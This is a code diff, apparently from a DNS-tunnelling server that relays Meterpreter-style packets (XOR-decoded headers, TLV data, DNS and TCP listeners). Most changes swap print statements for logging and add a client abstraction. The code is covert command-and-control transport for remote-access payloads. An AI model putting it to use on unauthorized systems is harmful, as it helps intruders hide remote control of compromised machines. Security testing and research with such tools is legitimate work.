-                    print "EPTY IN2"
+                    logger.info("EPTY IN2")
                     data = None
                 else:
-                    print "Server ERROR " + str(e) + "  '" + str(e)+"'"
+                    logger.error("Server ERROR %s", e, exc_info=True)
                     data = None
                     s = None
                     break
             except Exception  as e:
-                print "Server ERROR2 " + str(e)
+                logger.error("Server ERROR2 %s", e)
                 data = None
                 s = None
                 break
             s.settimeout(None)
 
+            cl = get_client_by_id('a')
             if data is None:
-                print "EMPTY"
-                #time.sleep(1)
-                #continue
-                return_tlv = get_meter_response(1)
+                logger.info("EMPTY")
+                # time.sleep(1)
+                # continue
+                return_tlv = cl.server_get_data(1)
+                logger.info("Got data length %d", len(return_tlv) if return_tlv else 0)
             else:
-                print("PARSE HEADER")
+                logger.info("PARSE HEADER")
                 # Parse header
                 xor_key = data[:4][::-1]
                 header_length = xor_bytes(xor_key, data[4:8])
                 pkt_length = struct.unpack('>I', header_length)[0] - 4
                 # Get all data
-                print "   in len: " + str(pkt_length)
-                s.settimeout(20*60)
-                while pkt_length > 0 :
+                logger.info("in len: %d", pkt_length)
+                s.settimeout(20 * 60)
+                while pkt_length > 0:
                     try:
-                        packet = s.recv(pkt_length) # get header
+                        packet = s.recv(pkt_length)  # get header
                         pkt_length -= len(packet)
                         data += packet
-                        print "left: " + str(pkt_length)
+                        logger.info("left: %d", pkt_length)
                     except Exception  as e:
-                        print "Server ERROR " + str(e)
+                        logger.error("SERVER ERROR %s", e, exc_info=True)
                         packet = None
                         s = None
                         break
                 # Ready
                 s.settimeout(None)
-                print "Server said {}".format(" ".join([ hex(ord(ch))[2:] for ch in data ]))
-                add_meter_request(data)
-                return_tlv = get_meter_response()
+                logger.debug("Server said {}".format(" ".join([hex(ord(ch))[2:] for ch in data])))
+                cl.server_put_data(data)
+                return_tlv = cl.server_get_data()
+                logger.info("Got data length %d", len(return_tlv) if return_tlv else 0)
 
             if return_tlv:
-                print "Client said {}".format(" ".join([ hex(ord(ch))[2:] for ch in return_tlv ]))
+                logger.debug("Client said {}".format(" ".join([hex(ord(ch))[2:] for ch in return_tlv])))
                 try:
+                    logger.info("Send data to server")
                     s.write(return_tlv)
-
                 except Exception  as e:
-                    print "Server ERROR 2 " + str(e)
+                    logger.error("Server ERROR 2 %s", e, exc_info=True)
                     data = None
                     s = None
                     break
-                print "SENT"
+                logger.info("SENT")
 
             time.sleep(2)
 
 
 class TCPRequestHandler(BaseRequestHandlerDNS):
-
     def get_data(self):
         data = self.request.recv(8192).strip()
         sz = struct.unpack('>H', data[:2])[0]
@@ -529,7 +642,6 @@ class TCPRequestHandler(BaseRequestHandlerDNS):
 
 
 class UDPRequestHandler(BaseRequestHandlerDNS):
-
     def get_data(self):
         return self.request[0].strip()
 
@@ -546,33 +658,41 @@ def main():
 
     args = parser.parse_args()
     global D
-    global ns_records
+    ns_records = []
     global IP
     global TTL
     global LPORT
+    global dns_server
     LPORT = args.lport
 
-    D =  DomainName(args.domain + '.') # Init domain string
+    D = DomainName(args.domain + '.')  # Init domain string
     ns_records.append(NS(D.ns1))
     ns_records.append(NS(D.ns2))
     IP = args.ipaddr
     TTL = 1
 
+    client = Client('a')
+    dns_server = DnsServer(args.domain, args.ipaddr, ns_records)
 
-    print("Starting nameserver...")
-
+    logger.info("Starting nameserver...")
 
     servers.append(SocketServer.ThreadingUDPServer(('', args.dport), UDPRequestHandler))
     servers.append(SocketServer.ThreadingTCPServer(('', args.dport), TCPRequestHandler))
+    servers.append(ThreadedTCPServer(('', LPORT), MeterBaseRequestHandler))
+    thread = threading.Thread(target=servers[-1].serve_forever)  # that thread will start one more thread for each request
+    thread.daemon = True  # exit the server thread when the main thread terminates
+    thread.start()
+
+    print("%s server loop running in thread: %s" % (servers[-1].RequestHandlerClass.__name__[:3], thread.name))
 
     for s in servers:
         thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
         thread.daemon = True  # exit the server thread when the main thread terminates
         thread.start()
-        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
+        logger.info("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
 
     try:
-        while 1:
+        while True:
             time.sleep(1)
             sys.stderr.flush()
             sys.stdout.flush()
@@ -580,6 +700,7 @@ def main():
     except KeyboardInterrupt:
         pass
     finally:
+        logger.info("Shutdown server...")
         for s in servers:
             s.shutdown()
 
